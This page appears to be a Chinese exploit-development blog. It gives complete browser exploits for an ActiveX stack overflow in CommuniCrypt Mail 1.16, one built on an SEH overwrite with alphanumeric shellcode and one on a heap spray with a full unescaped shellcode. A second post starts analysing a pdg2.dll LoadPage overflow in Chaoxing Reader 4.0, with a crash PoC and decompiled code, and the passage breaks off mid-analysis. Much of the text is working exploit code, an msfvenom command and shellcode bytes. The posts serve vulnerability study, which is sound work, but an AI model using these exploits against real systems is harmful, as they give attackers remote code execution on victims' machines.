<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></div><div class="line">   DWORD ExceptionCode;</div><div class="line">   DWORD ExceptionFlags;</div><div class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span></div><div class="line">   PVOID ExceptionAddress;</div><div class="line">   DWORD NumberParameters;</div><div class="line">   DWORD ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</div><div class="line">&#125; EXCEPTION_RECORD;</div></pre></td></tr></table></figure>
<p><code>ExceptionCode</code>成员即是异常代码，查看<code>01dcf2e0</code>地址里的内容为<code>c0000005</code>，这便是<code>ACCESS VIOLATION</code>的异常代码。</p>
<p>_except_handler回掉函数的第二个参数是一个指向establisher帧结构的指针，这里指针为<code>01dcf5cc</code>，这不是指向了SEH链表的第一个结点么，怎么又成了establisher帧结构的指针，有所疑问。</p>
<p>_except_handler回调函数的第三个参数是一个指向CONTEXT结构的指针。</p>
<p>_except_handler回调函数的第四个参数被称为DispatcherContext，暂时不太清楚。</p>
<p>我们再回过去看栈上的内容，就理解了为什么要用<code>pop pop ret</code>的ROP去覆盖SEH，调用异常处理回掉函数的时候，栈上是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">7c9232a6 ffd1            call    ecx &#123;41366a41&#125;</div><div class="line">stack:</div><div class="line">01dcf1fc  01dcf2e0</div><div class="line">01dcf200  01dcf5cc</div><div class="line">01dcf204  01dcf2fc</div><div class="line">01dcf208  01dcf2b4</div></pre></td></tr></table></figure>
<p>而call指令的作用是将下一条指令压入栈上，然后jmp到目标函数去，再执行call之前栈上<code>esp+4</code>处，正好保存了nseh地址（01dcf5cc），所以当跳转到<code>pop pop ret</code>的ROP时，保存的nseh地址就处在<code>esp+8</code>的位置，然后执行<code>pop pop ret</code>就跳到了nseh地址处，然后将该地址里的内容解析成指令来执行（回到了栈上有木有！可以执行shellcode了），我们用<code>jmp 06</code>指令来填充nseh，这样就可以直接跳转到shellcode处，以防止我们选择的ROP地址被解析成指令时，对后面shellcode操作有所影响。这样明白了之后，我们就可以这么写exp了：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">'clsid:F8D07B72-B4B4-46A0-ACC0-C771D4614B82'</span> <span class="attr">id</span>=<span class="string">'target'</span> &gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">alert("Ready to creash");</span></div><div class="line"><span class="undefined">junk1 = ""</span></div><div class="line"><span class="xml">while(junk1.length<span class="tag">&lt;<span class="name">272)junk1</span> += <span class="string">"C"</span>;</span></span></div><div class="line"><span class="undefined">ret = "\xff\xff\xff\xff";</span></div><div class="line"><span class="undefined">junk2 = "BBBBBBBB";</span></div><div class="line"><span class="undefined">nseh = "\xeb\x06\x90\x90";</span></div><div class="line"><span class="undefined">seh = "pop_pop_ret_addr";</span></div><div class="line"><span class="undefined">payload = junk1 + ret + junk2 + nseh +seh + shellcode;</span></div><div class="line"><span class="undefined">target.AddAttachments(payload);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="0x03-exp编写"><a href="#0x03-exp编写" class="headerlink" title="0x03 exp编写"></a>0x03 exp编写</h2><h3 id="exploit-with-SEH"><a href="#exploit-with-SEH" class="headerlink" title="exploit with SEH"></a>exploit with SEH</h3><p>接着前面的内容，将exp写完。在调试的时候发现一个问题，payload里面是不允许有坏字符的，即ASCII码值是不能超过0x7f的，超过0x7f会被程序转换成0x3f，所以我们不能用<code>\xeb\x06</code>去覆盖nseh了，并且选取的SEH跳板也要注意。</p>
<p>使用mona插件搜索<code>pop pop ret</code>跳板：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">!mona seh -m aosmtp.dll</div></pre></td></tr></table></figure>
<p>我选取了如下地址作为ROP：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x10020371 : pop esi # pop edi # ret</div></pre></td></tr></table></figure>
<p>nseh我选择了<code>\x50\x58\x50\x58</code>来覆盖，把nseh和seh解析成指令我们会发现，不会对后面的shellcode造成干扰，也不会触发异常，并且每个字符都是不超过0x7f的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">0x1000:	50		push	eax</div><div class="line">0x1001:	58		pop	eax</div><div class="line">0x1002:	50		push	eax</div><div class="line">0x1003:	58		pop	eax</div><div class="line">0x1004:	7103	jno	0x1009</div><div class="line">0x1006:	0210	add	dl, byte ptr [eax]</div></pre></td></tr></table></figure>
<p>然后我们便用msfvenom生成ASCII编码的shellcode：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/exec cmd=calc -a x86 --platform win -e x86/alpha_upper</div></pre></td></tr></table></figure>
<p>但是无论怎么生成，shellcode的前面几个字节都大于0x7f，动态调试一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = </div><div class="line"><span class="string">"\x89\xe0\xda\xc3\xd9\x70\xf4\x5e\x56\x59\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a\x48\x4c\x42\x55\x50\x35\x50\x45\x50\x33\x50\x4b\x39\x4a\x45\x56\x51\x59\x50\x45\x34\x4c\x4b\x56\x30\x46\x50\x4c\x4b\x36\x32\x54\x4c\x4c\x4b\x36\x32\x45\x44\x4c\x4b\x54\x32\x46\x48\x34\x4f\x58\x37\x51\x5a\x46\x46\x46\x51\x4b\x4f\x4e\x4c\x57\x4c\x55\x31\x53\x4c\x43\x32\x56\x4c\x47\x50\x49\x51\x48\x4f\x54\x4d\x43\x31\x48\x47\x4b\x52\x5a\x52\x56\x32\x51\x47\x4c\x4b\x50\x52\x42\x30\x4c\x4b\x50\x4a\x57\x4c\x4c\x4b\x30\x4c\x54\x51\x34\x38\x4d\x33\x37\x38\x55\x51\x38\x51\x46\x31\x4c\x4b\x46\x39\x31\x30\x53\x31\x58\x53\x4c\x4b\x37\x39\x35\x48\x4a\x43\x46\x5a\x50\x49\x4c\x4b\x30\x34\x4c\x4b\x43\x31\x39\x46\x36\x51\x4b\x4f\x4e\x4c\x49\x51\x48\x4f\x44\x4d\x35\x51\x4f\x37\x36\x58\x4d\x30\x44\x35\x5a\x56\x35\x53\x43\x4d\x4b\x48\x57\x4b\x33\x4d\x36\x44\x42\x55\x4d\x34\x30\x58\x4c\x4b\x56\x38\x56\x44\x33\x31\x48\x53\x55\x36\x4c\x4b\x34\x4c\x50\x4b\x4c\x4b\x30\x58\x45\x4c\x45\x51\x48\x53\x4c\x4b\x55\x54\x4c\x4b\x53\x31\x48\x50\x4c\x49\x47\x34\x31\x34\x31\x34\x51\x4b\x51\x4b\x55\x31\x51\x49\x30\x5a\x30\x51\x4b\x4f\x4d\x30\x31\x4f\x51\x4f\x31\x4a\x4c\x4b\x34\x52\x4a\x4b\x4c\x4d\x31\x4d\x52\x4a\x45\x51\x4c\x4d\x4b\x35\x4e\x52\x33\x30\x35\x50\x45\x50\x46\x30\x33\x58\x30\x31\x4c\x4b\x52\x4f\x4c\x47\x4b\x4f\x4e\x35\x4f\x4b\x4c\x30\x4f\x45\x59\x32\x36\x36\x55\x38\x49\x36\x4c\x55\x4f\x4d\x4d\x4d\x4b\x4f\x59\x45\x37\x4c\x33\x36\x33\x4c\x35\x5a\x4d\x50\x4b\x4b\x4b\x50\x32\x55\x34\x45\x4f\x4b\x57\x37\x34\x53\x43\x42\x42\x4f\x53\x5a\x53\x30\x31\x43\x4b\x4f\x4e\x35\x42\x43\x43\x51\x52\x4c\x32\x43\x35\x50\x41\x41"</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"This is a test"</span>);</div><div class="line">	__asm </div><div class="line">	&#123;</div><div class="line">		lea eax,shellcode</div><div class="line">		call eax</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>OD调试到shellcode处：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">00427508    89E0            mov     eax, esp</div><div class="line">0042750A    DAC3            fcmovb  st, st(3)</div><div class="line">0042750C    D970 F4         fstenv  (28-byte) ptr [eax-C]</div><div class="line">0042750F    5E              pop     esi</div><div class="line">00427510    56              push    esi</div><div class="line">00427511    59              pop     ecx</div></pre></td></tr></table></figure>
<p>可以发现其实这几条指令的作用是重定位，执行完<code>pop ecx</code>之后，ecx的值为<code>0x0042750A</code>，即第二条指令的地址。shellcode后面部分会用到ecx值，将其作为基址，加上偏移去取数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">00427528    3041 33         xor     byte ptr [ecx+33], al</div><div class="line">0042752B    48              dec     eax</div><div class="line">0042752C    48              dec     eax</div><div class="line">0042752D    3041 30         xor     byte ptr [ecx+30], al</div><div class="line">00427530    3041 42         xor     byte ptr [ecx+42], al</div></pre></td></tr></table></figure>
<p>所以只要将shellcode开头的前几个字节替换，将ecx定位到代码段附近即可。</p>
<p><code>Immunity debugger</code>在<code>0x10020371</code>处下断点，<code>shift + f9</code>忽略异常执行，在<code>pop pop ret</code>处断了下来：</p>
<p><img src="/img/CommuniCrypt Mail 1.16/0x03-1.png" alt="AOSMTP"></p>
<p>F8单步执行至retn结束，可以看到此时栈上<code>esp+8</code>的内容为<code>0x1DCF5CC</code>：</p>
<p><img src="/img/CommuniCrypt Mail 1.16/0x03-2.png" alt="AOSMTP"></p>
<p>所以我们可以构造<code>pop ecx;pop ecx;pop ecx</code>将<code>0x1DCF5CC</code>赋值给ecx，这样就将ecx的值定位到了执行的代码段附近，然后再填充一些不影响shellcode执行的指令，使得shellcode执行到<code>xor byte ptr [ecx+33], al</code>指令时，通过<code>[ecx+33]</code>能获取到正确的数。我构造的shellcode前面部分如下（shellcode从01DCF5D4地址处开始，前面8字节是nseh和seh的内容）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">01DCF5CC   50               PUSH EAX</div><div class="line">01DCF5CD   58               POP EAX</div><div class="line">01DCF5CE   50               PUSH EAX</div><div class="line">01DCF5CF   58               POP EAX</div><div class="line">01DCF5D0   71 03            JNO SHORT 01DCF5D5</div><div class="line">01DCF5D2   0210             ADD DL,BYTE PTR DS:[EAX]</div><div class="line">01DCF5D4   59               POP ECX</div><div class="line">01DCF5D5   59               POP ECX</div><div class="line">01DCF5D6   59               POP ECX</div><div class="line">01DCF5D7   59               POP ECX			;ecx = 0x1DCF5CC</div><div class="line">01DCF5D8   49               DEC ECX</div><div class="line">01DCF5D9   49               DEC ECX</div><div class="line">01DCF5DA   49               DEC ECX</div><div class="line">01DCF5DB   49               DEC ECX</div><div class="line">01DCF5DC   43               INC EBX</div><div class="line">01DCF5DD   43               INC EBX</div><div class="line">01DCF5DE   51               PUSH ECX</div><div class="line">01DCF5DF   5A               POP EDX</div><div class="line">01DCF5E0   56               PUSH ESI</div><div class="line">01DCF5E1   54               PUSH ESP</div><div class="line">01DCF5E2   58               POP EAX</div><div class="line">01DCF5E3   3330             XOR ESI,DWORD PTR DS:[EAX]</div><div class="line">01DCF5E5   56               PUSH ESI</div><div class="line">01DCF5E6   58               POP EAX</div><div class="line">01DCF5E7   34 41            XOR AL,41</div><div class="line">01DCF5E9   50               PUSH EAX</div><div class="line">01DCF5EA   3041 33          XOR BYTE PTR DS:[ECX+33],AL</div></pre></td></tr></table></figure>
<p>最终的EXP：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">'clsid:F8D07B72-B4B4-46A0-ACC0-C771D4614B82'</span> <span class="attr">id</span>=<span class="string">'target'</span> &gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">alert("Ready to creash");</span></div><div class="line"><span class="undefined">junk1 = ""</span></div><div class="line"><span class="xml">while(junk1.length<span class="tag">&lt;<span class="name">272)junk1</span> += <span class="string">"C"</span>;</span></span></div><div class="line"><span class="undefined">ret = "\xff\xff\xff\xff";</span></div><div class="line"><span class="undefined">junk2 = "BBBBBBBB";</span></div><div class="line"><span class="undefined">nseh = "\x50\x58\x50\x58";</span></div><div class="line"><span class="undefined">seh = "\x71\x03\x02\x10";</span></div><div class="line"><span class="undefined">shellcode = "YYYYIIIICCQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLJHLBUP5PEP3PK9JEVQYPE4LKV0FPLK62TLLK62EDLKT2FH4OX7QZFFFQKONLWLU1SLC2VLGPIQHOTMC1HGKRZRV2QGLKPRB0LKPJWLLK0LTQ48M378UQ8QF1LKF910S1XSLK795HJCFZPILK04LKC19F6QKONLIQHODM5QO76XM0D5ZV5SCMKHWK3M6DBUM40XLKV8VD31HSU6LK4LPKLK0XELEQHSLKUTLKS1HPLIG41414QKQKU1QI0Z0QKOM01OQO1JLK4RJKLM1MRJEQLMK5NR305PEPF03X01LKROLGKON5OKL0OEY266U8I6LUOMMMKOYE7L363L5ZMPKKKP2U4EOKW74SCBBOSZS01CKON5BCCQRL2C5PAA";</span></div><div class="line"><span class="undefined">payload = junk1 + ret + junk2 + nseh +seh + shellcode;</span></div><div class="line"><span class="undefined">target.AddAttachments(payload);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>我觉得我这个改shellcode的方法太麻烦了，不知道大佬们有没有什么好的思路没，可以绕过这里的字符限制。</p>
<h3 id="exploit-with-heap-spray"><a href="#exploit-with-heap-spray" class="headerlink" title="exploit with heap spray"></a>exploit with heap spray</h3><p>用堆喷射的话就不用考虑坏字符了，在堆上布置shellcode，跳到堆上执行即可。《Exploit 编写系列教程》的EXP如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- Load the AOSMTP Mail Object --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">'clsid:F8D07B72-B4B4-46A0-ACC0-C771D4614B82'</span> <span class="attr">id</span>=<span class="string">'target'</span> &gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span> &gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">// exploit for CommuniCrypt Mail</span></div><div class="line"><span class="undefined">var shellcode = unescape('%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u4100');</span></div><div class="line"><span class="undefined">var nops = unescape('%u9090%u9090');</span></div><div class="line"><span class="undefined">var headersize = 20;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">// create one block with nops</span></div><div class="line"><span class="undefined">var slackspace = headersize + shellcode.length;</span></div><div class="line"><span class="xml">while(nops.length <span class="tag">&lt; <span class="attr">slackspace</span>) <span class="attr">nops</span> += <span class="string">nops;</span></span></span></div><div class="line"><span class="undefined">var fillblock= nops.substring(0, slackspace);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">//enlarge block with nops, size 0x50000</span></div><div class="line"><span class="undefined">var block= nops.substring(0, nops.length - slackspace);</span></div><div class="line"><span class="xml">while(block.length+slackspace <span class="tag">&lt; <span class="attr">0x50000</span>) <span class="attr">block</span>= <span class="string">block+</span> <span class="attr">block</span>+ <span class="attr">fillblock</span>;</span></span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">//spray 500 times : nops + shellcode</span></div><div class="line"><span class="undefined">var memory=new Array();</span></div><div class="line"><span class="xml">for( counter=0; counter<span class="tag">&lt;<span class="name">500;</span> <span class="attr">counter</span>++) <span class="attr">memory</span>[<span class="attr">counter</span>]= <span class="string">block</span> + <span class="attr">shellcode</span>;</span></span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">alert("Spray done, ready to trigger crash");</span></div><div class="line"><span class="undefined">junk1 = ""</span></div><div class="line"><span class="xml">while(junk1.length<span class="tag">&lt;<span class="name">272)junk1</span> += <span class="string">"C"</span>;</span></span></div><div class="line"><span class="undefined">ret = "\xff\xff\xff\xff";</span></div><div class="line"><span class="undefined">junk2 = "BBBBBBBB";</span></div><div class="line"><span class="undefined">nseh = "AAAA";</span></div><div class="line"><span class="undefined">seh = "\x0c\x0c\x0c\x0c";</span></div><div class="line"><span class="undefined">payload = junk1 + ret + junk2 + nseh +seh;</span></div><div class="line"><span class="undefined">target.AddAttachments(payload);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/21/chaoxing-reader-4-0-md/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/21/chaoxing-reader-4-0-md/" itemprop="url">超星阅览器v4.0 - pdg2.dll Stack Buffer Overflow</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-21T11:37:18+08:00">
                2017-08-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Vulnerability/" itemprop="url" rel="index">
                    <span itemprop="name">Vulnerability</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>超星阅览器v4.0版本中的ActiveX插件pdg2.dll存在栈溢出漏洞，调用<code>LoadPage</code>函数时没有对参数长度作限制，从而可以getshell，之所以调这个漏洞，是想学习一下IE8下的heap spray，参考的这篇文章：<a href="http://blog.csdn.net/qs_hud/article/details/9821735" target="_blank" rel="external">HeapSpray+ROP绕过IE8的DEP防护 ——堆喷射技术利用超星老漏洞</a></p>
<h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 Windows XP Service Pack 3</div><div class="line">2 Internet Explorer 6/7/8</div><div class="line">3 超星阅览器v4.0</div></pre></td></tr></table></figure>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>触发IE崩溃的脚本如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">'clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2'</span> <span class="attr">id</span>=<span class="string">'target'</span> &gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">var arg1 = ""</span></div><div class="line"><span class="xml">while(arg1.length <span class="tag">&lt; <span class="attr">1000</span>) <span class="attr">arg1</span> += <span class="string">"A"</span>;</span></span></div><div class="line"><span class="undefined">var arg2=1</span></div><div class="line"><span class="undefined">var arg3=1</span></div><div class="line"><span class="undefined">var arg4=1</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">target.LoadPage(arg1,arg2,arg3,arg4);</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>漏洞点在pdg2.dll中的函数<code>sub_1001CD30</code>里，调用<code>WideCharToMultiByte</code>函数将unicode字符串转换成多字节字符串时造成栈溢出，<code>lpString</code>即为<code>LoadPage</code>的第一个参数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">sub_1001CD30</span><span class="params">(<span class="keyword">int</span> a1, LPCWSTR lpString, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  ......</div><div class="line">  <span class="keyword">if</span> ( lpString )</div><div class="line">  &#123;</div><div class="line">    v7 = lstrlenW(lpString);</div><div class="line">    v8 = <span class="number">2</span> * v7 + <span class="number">2</span>;</div><div class="line">    v9 = <span class="number">2</span> * v7 + <span class="number">5</span>;</div><div class="line">    LOBYTE(v9) = v9 &amp; <span class="number">0xFC</span>;</div><div class="line">    v10 = alloca(v9);</div><div class="line">    v11 = <span class="number">0</span>;</div><div class="line">    WideCharToMultiByte(<span class="number">0</span>, <span class="number">0</span>, lpString, <span class="number">-1</span>, &amp;v11, v8, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">    sub_10015AD0(&amp;v11);</div><div class="line">    result = <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  ......</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>动态调试就会发现，触发IE崩溃的并不是函数<code>sub_1001CD30</code>，因为压根执行不到ret处，在调用的子函数里面就已经崩了，跟进<code>sub_10015AD0</code>函数里：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">thiscall <span class="title">sub_10015AD0</span><span class="params">(<span class="keyword">int</span> <span class="keyword">this</span>, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> v2; <span class="comment">// esi@1</span></div><div class="line"></div><div class="line">  v2 = <span class="keyword">this</span>;</div><div class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">16484</span>) = <span class="number">0</span>;</div><div class="line">  sub_10012D10(a2, <span class="number">0</span>);</div><div class="line">  <span class="keyword">return</span> sub_10015AB0(v2);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>继续跟进<code>sub_10012D10</code>函数里，该函数第二个参数<code>a2</code>即是前面转换成的多字节字符串，首先从字符串的最后一字节开始搜索，直到找到某个字符不为<code>&#39;\\&#39;、&#39;/&#39;、&#39; &#39;</code>，然后将该字符之前的所有内容（包括该字符）拷贝到局部变量<code>v11</code>，然后调用函数<code>sub_10013DC0</code>。</p>
